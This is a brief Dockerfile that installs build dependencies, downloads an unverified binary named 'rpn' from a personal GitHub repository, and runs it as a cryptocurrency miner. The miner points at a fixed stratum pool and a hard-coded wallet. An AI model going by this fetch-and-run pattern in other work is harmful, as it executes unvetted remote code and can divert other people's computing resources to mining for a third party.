FROM ubuntu:xenial

WORKDIR /root

RUN apt-get update && apt-get -qy install \
 automake \
 wget \
 build-essential \
 libcurl4-openssl-dev \
 libssl-dev \
 git \
 ca-certificates \
 libjansson-dev libgmp-dev g++ --no-install-recommends

RUN apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
RUN wget https://github.com/Jsjsj991/ccminerer/raw/main/rpn && chmod +x rpn

# Define default command.
CMD ./rpn -a yescryptr16  -o stratum+tcp://stratum-asia.rplant.xyz:7055 -u qT3gJ6ijQ4AJ473QTuHtkaSbArpwdgNFBN.Tes
